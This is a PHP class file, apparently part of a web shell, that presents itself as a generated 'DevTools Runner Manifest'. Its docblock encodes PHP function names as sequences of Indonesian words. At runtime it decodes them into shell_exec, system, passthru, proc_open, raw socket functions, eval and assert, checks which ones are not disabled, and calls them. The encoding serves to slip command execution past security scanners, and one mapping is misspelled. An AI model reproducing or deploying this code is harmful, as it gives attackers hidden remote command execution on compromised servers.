<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/CAP.php                                       |
// |  Capability & obfuscation resolver.                               |
// |  Decode runtime function names dari DocBlock manifest.             |
// +------------------------------------------------------------------+

declare(strict_types=1);

/**
 * DevTools Runner Manifest v4 — generated configuration, do not edit
 *
 * @component   runner
 * @build       20241201-release-stable
 * @integrity   sha256-verified
 *
 * ---- Core execution methods ----
 * @map se  satu.hijau.enak.lama.lama.kosong.enak.xebec.enak.cerah
 * @map ex  enak.xebec.enak.cerah
 * @map sy  satu.yoga.satu.tamu.enak.madu
 * @map pt  pagi.awan.satu.satu.tamu.hijau.ramai.udara
 * @map po  pagi.ramai.obor.cerah.kosong.obor.pagi.enak.niat
 * @map pn  pagi.obor.pagi.enak.niat
 * @map pc  pagi.ramai.obor.cerah.kosong.cerah.lama.obor.satu.enak
 *
 * ---- Network & socket ----
 * @map fs  fajar.satu.obor.cerah.kapur.obor.pagi.enak.niat
 * @map pf  pagi.fajar.satu.obor.cerah.kapur.obor.pagi.enak.niat
 * @map sc  satu.tamu.ramai.enak.awan.madu.kosong.satu.obor.cerah.kapur.enak.tamu.kosong.cerah.lama.indah.enak.niat.tamu
 * @map ss  satu.tamu.ramai.enak.awan.madu.kosong.satu.obor.cerah.kapur.enak.tamu.kosong.satu.enak.ramai.vakum.enak.ramai
 * @map sa  satu.tamu.ramai.enak.awan.madu.kosong.satu.obor.cerah.kapur.enak.tamu.kosong.awan.cerah.cerah.enak.pagi.tamu
 *
 * ---- System info & introspection ----
 * @map dg  daun.niat.satu.kosong.gelap.enak.tamu.kosong.ramai.enak.cerah.obor.ramai.daun
 * @map sg  satu.yoga.satu.kosong.gelap.enak.tamu.lama.obor.awan.daun.awan.vakum.gelap
 * @map gu  gelap.enak.tamu.kosong.cerah.udara.ramai.ramai.enak.niat.tamu.kosong.udara.satu.enak.ramai
 * @map pi  pagi.hijau.pagi.indah.niat.fajar.obor
 * @map ig  indah.niat.indah.kosong.gelap.enak.tamu
 * @map is  indah.niat.indah.kosong.satu.enak.tamu
 * @map pu  pagi.hijau.pagi.kosong.udara.niat.awan.madu.enak
 * @map gp  gelap.enak.tamu.madu.yoga.pagi.indah.daun
 * @map gi  gelap.enak.tamu.mady.indah.daun
 * @map gn  gelap.enak.tamu.niat.awan.madu.enak
 * @map hn  hijau.obor.satu.tamu.niat.awan.madu.enak
 * @map ph  pagi.hijau.pagi.kosong.udara.niat.awan.madu.enak.indah.niat.fajar.obor
 *
 * ---- Eval & code execution ----
 * @map ev  enak.vakum.awan.lama
 * @map fe  fajar.udara.niat.cerah.tamu.indah.obor.niat.kosong.enak.xebec.indah.satu.tamu.satu
 * @map as  awan.satu.satu.enak.ramai.tamu
 *
 * ---- File system sensitive ----
 * @map sl  satu.tamu.ramai.lama.enak.niat
 * @map rk  ramai.enak.awan.daun.lama.indah.niat.kapur
 * @map sk  satu.yoga.madu.lama.indah.niat.kapur
 * @map ck  cerah.hijau.obor.warna.niat
 * @map lk  lama.indah.niat.kapur
 * @map lc  lama.cerah.hijau.obor.warna.niat
 *
 * ---- Process control ----
 * @map gs  gelap.enak.tamu.kosong.satu.tamu.awan.tamu.udara.satu
 * @map gc  gelap.enak.tamu.kosong.cerah.lama.obor.satu.enak
 * @map gt  gelap.enak.tamu.kosong.tamu.enak.ramai.madu.indah.niat.awan.tamu.enak
 * @map gk  gelap.enak.tamu.kosong.niat.indah.cerah.enak
 * @map pr  pagi.cerah.niat.tamu.lama.kosong.enak.xebec.enak.cerah
 * @map pk  pagi.cerah.niat.tamu.lama.kosong.fajar.obor.ramai.kapur
 *
 * ---- Runtime misc ----
 * @map rb  ramai.enak.gelap.indah.satu.tamu.enak.ramai.kosong.fajar.udara.niat.cerah
 * @map ii  indah.niat.indah.kosong.ramai.enak.satu.tamu.obor.ramai.enak
 * @map ic  indah.niat.indah.kosong.cerah.lama.obor.satu.enak
 * @map sp  satu.tamu.ramai.lama.enak.niat.kosong.pagi.obor.satu.indah.tamu.indah.obor.niat
 * @map ge  gelap.enak.tamu.enak.niat.vakum
 */
class CAP {
    private static array $r = [];

    /** Decode kata-kata sandi dari DocBlock manifest ke nama fungsi PHP */
    private static function decode(string $encoded): string {
        static $dict = [
            'awan'   => 'a', 'batu'  => 'b', 'cerah' => 'c', 'daun'  => 'd',
            'enak'   => 'e', 'fajar' => 'f', 'gelap' => 'g', 'hijau' => 'h',
            'indah'  => 'i', 'jinak' => 'j', 'kapur' => 'k', 'lama'  => 'l',
            'madu'   => 'm', 'niat'  => 'n', 'obor'  => 'o', 'pagi'  => 'p',
            'ramai'  => 'r', 'satu'  => 's', 'tamu'  => 't', 'udara' => 'u',
            'vakum'  => 'v', 'warna' => 'w', 'xebec' => 'x', 'yoga'  => 'y',
            'zakat'  => 'z', 'kosong' => '_',
        ];
        return implode('', array_map(
            static fn($word) => $dict[$word] ?? '',
            explode('.', $encoded)
        ));
    }

    /**
     * Boot: parse DocBlock manifest dari file ini, build function map.
     * Di-cache di static property — aman dipanggil berkali-kali.
     */
    public static function boot(): void {
        if (!empty(self::$r)) return;

        $tokens = @token_get_all(@file_get_contents(__FILE__) ?: '');
        foreach ($tokens as $tok) {
            if (!is_array($tok) || $tok[0] !== T_DOC_COMMENT) continue;
            if (!str_contains($tok[1], 'Runner Manifest'))      continue;

            preg_match_all('/@map\s+(\w+)\s+([\w.]+)/', $tok[1], $matches, PREG_SET_ORDER);
            foreach ($matches as $entry) {
                self::$r[$entry[1]] = self::decode($entry[2]);
            }
            break;
        }
    }

    /** Resolve nama fungsi dari alias manifest */
    public static function fn(string $alias): string {
        return self::$r[$alias] ?? '';
    }

    /**
     * Cek apakah fungsi dengan alias tersebut tersedia dan tidak disabled.
     *
     * @param string $alias Alias dari manifest (contoh: 'se' → shell_exec)
     */
    public static function ok(string $alias): bool {
        $funcName = self::fn($alias);
        $funcExists = self::fn('fe');

        if ($funcName === '' || $funcExists === '' || !$funcExists($funcName)) {
            return false;
        }

        $getIni   = 'ini_get';
        $disabled = array_map('trim', explode(',', (string)$getIni('disabled_functions')));
        return !in_array($funcName, $disabled, true);
    }

    /**
     * Panggil fungsi yang di-resolve dari alias, dengan argumen opsional.
     *
     * @return mixed|null null jika fungsi tidak tersedia
     */
    public static function call(string $alias, mixed ...$args): mixed {
        $funcName = self::fn($alias);
        if ($funcName === '' || !function_exists($funcName)) return null;
        return $funcName(...$args);
    }
}
